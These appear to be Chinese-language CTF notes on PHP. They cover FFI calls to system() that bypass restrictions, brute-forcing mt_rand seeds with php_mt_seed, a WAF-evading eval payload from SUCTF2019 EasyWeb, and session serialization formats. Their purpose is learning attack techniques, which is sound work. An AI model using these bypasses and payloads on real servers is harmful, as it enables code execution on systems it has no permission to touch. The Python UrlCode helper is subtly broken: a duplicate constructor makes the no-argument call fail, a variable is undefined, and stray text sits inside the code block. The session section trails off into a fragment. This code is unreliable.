# §5 语言参考

## §8.1 影响PHP行为（Affecting PHP's Behaviour）

### §8.1.4 FFI（Foreign Function Interface）

FFI允许PHP加载共享链接库（`.dll`/`.so`）并调用其中的C语言函数。当PHP限制了访问权限，但是运行PHP的账户没有设置访问权限时，可以考虑调用`stdlib.h`中的`system()`绕过。

> 注意：FFI扩展非常危险，因此`php.ini`默认不启用FFI。
>
> ```ini
> # php.ini
> [ffi]
> ; FFI API restriction.  :
> ; "preload" - 启用CLI脚本与预加载文件 (默认)
> ; "false"   - 总是禁用
> ; "true"    - 总是启用
> ffi.enable=preload
> 
> ; 将被预加载的头文件列表,文件名使用常量DIRECTORY_SEPARATOR分割(默认为/),允许使用*、?等通配符(wildcard patterns)
> ffi.preload=
> ```
>
> 由于`ffi.enable`缺省为`preload`，不允许Web访问调用。但是我们可以利用`eval()`与反序列化的方式绕过这个限制，让PHP误认为`FFI::`系列方法是从CLI调用的。

#### §8.1.4.1 FFI类

FFI类的实例由其静态方法`FFI::cdef(string $code="", ?string $lib=null)`创建。返回的FFI实例包含着解析C语言代码`$code`得到的函数与数据结构：

```php
<?php
$ffi = FFI::cdef("
	int printf(const char *format, ...);
    int system(const char *command);
");
$ffi->printf("Function \"%s\" is called!\n", "printf");
    // Function "printf" is called!
$ffi->system("whoami");
	// root
?>
```

##### §8.1.4.1.1 `FFI->new()`与`FFI::free()`

`FFI::new(string $type, bool $owned=true, bool $persistent=false):?FFI::CData`用于根据`FFI`实例创建一个代表结构体或数组的`FFI::CDATA`实例。

- `string $type`：对C语言数据类型的合法声明
- `bool $owned`：创建的结构体的生命周期是否自动结束。自动结束指的是当PHP脚本中没有对该`FFI::CDATA`实例的变量引用时自动释放，手动结束指的是调用`FFI::free()`方法手动释放。
- `bool $persistent`：决定将变量的空间分配到系统堆还是PHP请求堆中。系统堆等价于`malloc()`，PHP请求堆等价于`emalloc()`。

```php
<?php
$ffi = FFI::cdef("typedef struct Point2D{ double x; double y; }Point2D;");
$point = $ffi->new("Point2D"); $point->x = 1.414; $point->y = 3.14159265;
var_dump($point);
    // class FFI\CData#2 (2) {
    //   public $x => double(1.414)
    //   public $y => double(3.14159265)
    // }

$array = FFI::new("int[8]");
for($i = 0 ; $i < 8 ; ++$i){ $array[$i] = $i; }
var_dump($array);
    // class FFI\CData#3 (8) {
    //   public ${0} => int(0)
    //   public ${1} => int(1)
    //   ......
    //   public ${7} => int(7)
    // }
?>
```



## §8.13 数学扩展（Mathematical Extensions）

### §8.13.36 梅森旋转算法——`mt_getrandmax()`、`mt_rand()`、`mt_srand()`

[梅森旋转算法](https://en.wikipedia.org/wiki/Mersenne_Twister)是一种伪随机数生成算法，现在被广泛应用于多种编程语言的默认随机数生成器。PHP为其提供了`mt_getrandmax()`、`mt_rand()`、`mt_srand()`这三个API实现。

- `mt_getrandmax(): int`

  该函数返回`mt_rand()`可能返回的最大值。PHP默认使用的是32位版本的梅森旋转算法，因此返回的最大值为$2^{32}-1$。

- `mt_srand(int $seed = 0, int $mode = MT_RAND_MT19937): void`

  这是梅森旋转算法的种子`$seed:int`，若`$seed`等于0，则缺省值为**`mt_srand()`或`mt_rand()`第一次被调用时的时间戳**。

  > 在PHP 7.1.0之前，PHP使用的梅森旋转算法一直是错误的。为保证兼容性，对应的`$mode`为`MT_RAND_PHP`。
  >
  > 自PHP 7.1.0起，PHP使用的是正确的梅森旋转算法，并将`srand()`和`mt_srand()`合并成功能完全相同的函数。为保证兼容性，这两个函数都保留了下来，对应的`$mode`为`MT_RAND_MT19937`。

- `mt_rand([$min = 0, $max = mt_getrandmax()]): int`

  随机返回`[$min,$max]`范围之内的一个整数。

梅森旋转算法虽然运算速度快，且能产生高质量的随机数，但是它本身不是一个密码学意义上的安全算法。理论上只要能获取其一段连续的时间内产生的足够多的随机数输出，那么就可以反向逆推出使用的种子。

`php_md_seed`是开源项目[Openwall](https://www.openwall.com/php_mt_seed)发布的一款PHP梅森旋转算法的种子爆破工具。

- `PHP < 3.0.6`：使用`php_mt_seed 3.4`
- `7.0.x >= PHP >= 3.0.7`：使用`php_mt_seed 4.0`
- `PHP >= 8.0`：**暂无适配（做题时一定要考虑PHP版本！）**

```shell
$ curl -O https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 15608  100 15608    0     0   7290      0  0:00:02  0:00:02 --:--:--  7293

$ tar -x -f php_mt_seed-4.0.tar.gz
$ cd php_mt_seed-4.0/
$ ls
	Makefile  php_mt_seed.c  README

$ make
    gcc -Wall -march=native -mtune=generic -O2 -fomit-frame-pointer -funroll-loops -fopenmp php_mt_seed.c -o php_mt_seed
    php_mt_seed.c:47:2: warning: #warning AVX-512 not enabled. Try gcc -mavx512f (on Intel Knights Landing, Skylake-X, or some newer). [-Wcpp]
       47 | #warning AVX-512 not enabled. Try gcc -mavx512f (on Intel Knights Landing, Skylake-X, or some newer).
          |  ^~~~~~~
```

使用方法：

1. 根据`mt_rand()`的第一个随机数爆破种子

   只输入一个形参，`./php_mt_seed <mt_rand()的第一个随机数>`：

   ```shell
   $ php -r 'mt_srand(1234567890); echo mt_rand(), "\n";'
       1328851649
   
   $ time ./php_mt_seed 1328851649
       Pattern: EXACT
       Version: 3.0.7 to 5.2.0
       Found 0, trying 0xfc000000 - 0xffffffff, speed 18382.0 Mseeds/s 
   	......
       seed = 0x499602d2 = 1234567890 (PHP 5.2.1 to 7.0.x; HHVM)
       seed = 0x499602d2 = 1234567890 (PHP 7.1.0+)
       Found 4, trying 0xfe000000 - 0xffffffff, speed 195.7 Mseeds/s 
       Found 4
   
       ________________________________________________________
       Executed in   22.19 secs    fish           external
          usr time  262.45 secs  436.00 micros  262.44 secs
          sys time    0.12 secs    0.00 micros    0.12 secs
   ```

2. 根据`mt_rand()`输出的第一个数的上下界爆破种子

   输入两个形参，`./php_mt_seed <mt_rand()的第一个随机数的下界> <mt_rand()的第一个随机数的上界>`：

   ```shell
   $ php -r 'mt_srand(114514); echo mt_rand(), "\n";'
   1476944489
   
   $ time ./php_mt_seed 1476944488 1476944490
       Pattern: RANGE
       Version: 3.0.7 to 5.2.0
       Found 0, trying 0x2c000000 - 0x2fffffff, speed 2050.5 Mseeds/s 
       seed = 0x2e3ee3ae = 775873454 (PHP 3.0.7 to 5.2.0)
       seed = 0x2e3ee3af = 775873455 (PHP 3.0.7 to 5.2.0)
       ......
       Found 8, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s 
       seed = 0x0001bf52 = 114514 (PHP 7.1.0+)
       ......
       Found 23, trying 0xfe000000 - 0xffffffff, speed 140.5 Mseeds/s 
       Found 23
   
       ________________________________________________________
       Executed in   32.82 secs    fish           external
          usr time  379.62 secs  426.00 micros  379.62 secs
          sys time    0.18 secs    0.00 micros    0.18 secs
   ```

3. 根据`mt_rand($min,$max)`输出的第一个数的上下界爆破种子

   输入四个形参，`./php_mt_seed <mt_rand()的第一个随机数的下界> <mt_rand()的第一个随机数的上界>,<$min>,<$max>`：

4. 根据`mt_rand($min,$max)`输出的一系列数字的上下界爆破种子

   输入大于等于五个形参，从头开始，每$4$个实参一组等价于第3种情况，剩余的0~3个实参等价于第1/2种情况。

   ```php
   # test.php
   <?php
   mt_srand(114514);
   for($i = 10000000 ; $i < 10000010 ; $i++){
       $random = mt_rand($i,2*$i);
       printf("%d %d %d %d ",$random,$random,$i,2*$i);
   }
   ```

   ```shell
   $ php ./test.php
       13888684 13888684 10000000 20000000 19083320 19083320 10000001 ......
   
   $ time ./php_mt_seed `php ../test.php`
       Pattern: EXACT-FROM-10000001 EXACT-FROM-10000002 EXACT-FROM-10000003 EXACT-FROM-10000004 EXACT-FROM-10000005 EXACT-FROM-10000006 EXACT-FROM-10000007 EXACT-FROM-10000008 EXACT-FROM-10000009 EXACT-FROM-10000010
       Version: 3.0.7 to 5.2.0
       Found 0, trying 0xfc000000 - 0xffffffff, speed 1368.2 Mseeds/s 
       Version: 5.2.1+
       Found 0, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s 
       seed = 0x0001bf52 = 114514 (PHP 7.1.0+)
       Found 1, trying 0xfe000000 - 0xffffffff, speed 117.2 Mseeds/s 
   
       real    0m39.857
       user    7m44.354s
       sys     0m0.253s
   ```


## §8.16 其它基本扩展（Other Basic Extension）

### §8.16.7 杂项函数

#### §8.16.7.7 `eval()`

`eval(string $code)`将`$code`作为PHP代码执行。

预先给出造好的Url编码轮子：

```python
class UrlCode:
    
    def __init__(self) -> None:
        self.url = []

    def __init__(self,url:str) -> None:
        self._url = list(url)

    # def __init__(self,ascii:int) -> None:
    #     self._url = [chr(ascii)]

    def __getitem__(self,key:int) -> str:
        # return UrlCode.urlencode(self._url[key])
        return self._url[key]

    def __setitem__(self,key:int,value:str) -> None:
        if len(value) == 1:
            self._url[key] = value
            return
        raise AttributeError("Not assigned a single character to a char.")

    def append(self,value:str) -> None:
        self._url += value

    @staticmethod
    def urlencode(url:str) -> str:
        result = ''
        for character in url:
            result += ('%' + format(ord(character),'x'))
        return result

    @staticmethod
    def xor(url_1:'UrlCode',url_2:'UrlCode') -> 'UrlCode':
        url_xor = UrlCode()
        length_2 = len(url_2) - 1
        index_2 = 0
        for index_1 in range(len(url_1)):
            url_xor.append(ord(url_1[index_1])^ord(url_2[index_2]))
            index_2 += 1
            index %= length_2
        return url_xor

    def xor(self,url_new:'UrlCode') -> 'UrlCode':
        length_new = len(url_new)
        index_new = 0
        for index_self in range(len(self._url)):
            self._url[index_self] = chr(ord(self._url[index_self]) ^ ord(url_new[index_new]))
            index_new += 1
            index_new %= length_new
        return self

    def __len__(self) -> int:
        return len(self._url)

    def __str__(self) -> str:
        return UrlCode.urlencode(self._url)

url1 = UrlCode("123")
url2 = UrlCode('\xff')
print(url1.xor(url2).xor(url2)) # %31%32%33
print(UrlCode.xor(url1,url2)) # %ce%cd%cc
```

例如[[SUCTF2019]EasyWeb](https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF%202019%20Easyweb.md)对`$code`给定下列WAF：

- 字符串长度不得超过18
- 只许含有`! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }`与其它非ASCII字符
- 字符种类数不能大于12
- 满足上述条件才执行`eval($code)`

可以考虑构造Payload：`$code=$_GET['\xff']();`与`$\xff=phpinfo()`

```python
url_GET = UrlCode('_GET')
url_AllXff = UrlCode('\xff\xff\xff\xff')
url_GET_Xor = url_GET.xor(url_AllXff)
url_Xff = UrlCode('\xff')
url = "?_=${" + str(url_AllXff) + '^' + str(url_GET_Xor) + '}{' + str(url_Xff) + '}();&' + str(url_Xff) +'=phpinfo'

print(url) # ?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo

或者考虑取反：$code=(~%8F%97%8F%96%91%99%90)();
```

> 注意：PHP从[7.4.0](https://stackoverflow.com/a/59158847/16366622)开始取消通过花括号获取数组/字符串元素的特性。
>
> ```php
> // PHP < 7.4.0
> $string = 'abc';
> echo $string{0}; // a
> $array = [1, 2, 3];
> echo $array{0}; // 1
> 
> // PHP >= 7.4.0 
> echo $string[0]; // a
> echo $array[0]; // 1
> echo $array{0}; // Deprecated: Array and string offset access syntax with curly braces is deprecated
> ```

> 注意：PHP从[7.2.0](https://www.php.net/manual/zh/migration72.deprecated.php)开始，当常量不存在时，不再将常量名解析成字符串。
>
> ```php
> // PHP < 7.2.0
> print(HelloWorld);
> 	// Warning: Use of undefined constant HelloWorld - assumed 'HelloWorld' (this will throw an Error in a future version of PHP) in %s on line %d
> 	// 输出HelloWorld
> 
> // PHP >= 7.2.0
> print(HelloWorld);
> 	// PHP Fatal error:  Uncaught Error: Undefined constant "HelloWorld" in %s:%d
> ```

## §8.20 Session扩展（Session Extensions）

Session的本质是一个二进制文件。其文件名为`sess_`+`PHPSESSID`。其中`PHPSESSID`可从浏览器的Cookie中获取：

```php
<?php
session_save_path('./');
session_start();
$_SESSION['username'] = 'admin';
$_SESSION['password'] = "123456";
```

Session的存储引擎由`php.ini`中的`session.serialize_handler`参数决定：

```ini
; Handler used to serialize data. php is the standard serializer of PHP.
; https://php.net/session.serialize-handler
session.serialize_handler = php
```

根据[官方文档](https://www.php.net/manual/en/session.configuration.php)，PHP提供了三种不同的存储引擎：

- `php_serialize`：PHP Serialize Format，对应的Session等于`serialize($_SESSION)`。

  ```shell
  $ hexdump -C sess_......
  00000000  61 3a 32 3a 7b 73 3a 38  3a 22 75 73 65 72 6e 61  a:2:{s:8:"userna
  00000010  6d 65 22 3b 73 3a 35 3a  22 61 64 6d 69 6e 22 3b  me";s:5:"admin";
  00000020  73 3a 38 3a 22 70 61 73  73 77 6f 72 64 22 3b 73  s:8:"password";s
  00000030  3a 36 3a 22 31 32 33 34  35 36 22 3b 7d           :6:"123456";}
  ```

- `php_binary`/`php`：PHP Internal Format

  `php`对应的Session为键名+竖线+经过`serialize()`序列化的值。

  ```shell
  $ hexdump -C sess_......
  00000000  75 73 65 72 6e 61 6d 65  7c 73 3a 35 3a 22 61 64  username|s:5:"ad
  00000010  6d 69 6e 22 3b 70 61 73  73 77 6f 72 64 7c 73 3a  min";password|s:
  00000020  36 3a 22 31 32 33 34 35  36 22 3b                 6:"123456";
  ```

  `php_binary`在`php`的基础上，在每个键名之前都添加一个`chr(键名长度)`的ASCII字符。

  ```shell
  $ hexdump -C sess_......
  00000000  08 75 73 65 72 6e 61 6d  65 73 3a 35 3a 22 61 64  .usernames:5:"ad
  00000010  6d 69 6e 22 3b 08 70 61  73 73 77 6f 72 64 73 3a  min";.passwords:
  00000020  36 3a 22 31 32 33 34 35  36 22 3b                 6:"123456";
  ```

- `wddx`：Web Distributed Data eXchange机制。此选项要求编译PHP时加入WDDX支持。

> - `session.serialize_handler` string
>
>   `session.serialize_handler` defines the name of the handler which is used to serialize/deserialize data. PHP serialize format (name `php_serialize`), PHP internal formats (name `php` and `php_binary`) and WDDX are supported (name `wddx`). WDDX is only available, if PHP is compiled with [WDDX support](https://www.php.net/manual/en/ref.wddx.php). `php_serialize` uses plain serialize/unserialize function internally and does not have limitations that `php` and `php_binary` have. Older serialize handlers cannot store numeric index nor string index contains special characters (`|` and `!`) in $_SESSION. Use `php_serialize` to avoid numeric index or special character errors at script shutdown. Defaults to `php`.

### §8.20.5 Session上传进度

PHP自5.4.0起，当`php.ini`配置文件中`session.upload_progress.enabled`设为`On`时，可以检测每个文件的上传进度。

```php
<?php
	sess
?>
```





require_once()重复包含：https://syunaht.com/p/2339718074.html